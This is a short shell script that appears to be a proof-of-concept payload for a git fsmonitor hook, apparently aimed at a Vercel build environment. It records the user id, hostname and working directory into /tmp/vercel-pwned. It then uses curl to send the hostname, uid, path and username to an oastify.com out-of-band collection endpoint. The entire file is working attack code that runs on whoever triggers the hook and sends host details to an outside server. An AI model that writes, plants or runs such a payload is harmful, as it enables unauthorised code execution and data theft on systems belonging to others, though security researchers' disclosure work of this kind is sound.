#!/bin/sh

{
  echo "=== fsmonitor triggered ==="
  date
  id
  hostname
  pwd
} > /tmp/vercel-pwned 2>&1

curl -sS --connect-timeout 5 --max-time 10 \
  --get \
  --data-urlencode "host=$(hostname)" \
  --data-urlencode "uid=$(id -u)" \
  --data-urlencode "pwd=$(pwd)" \
  --data-urlencode "user=$(whoami)" \
  "https://yfhoz96xhi1ekrwm8tgp9hc0zr5it8hx.oastify.com/collect" \
  > /dev/null 2>&1 || true
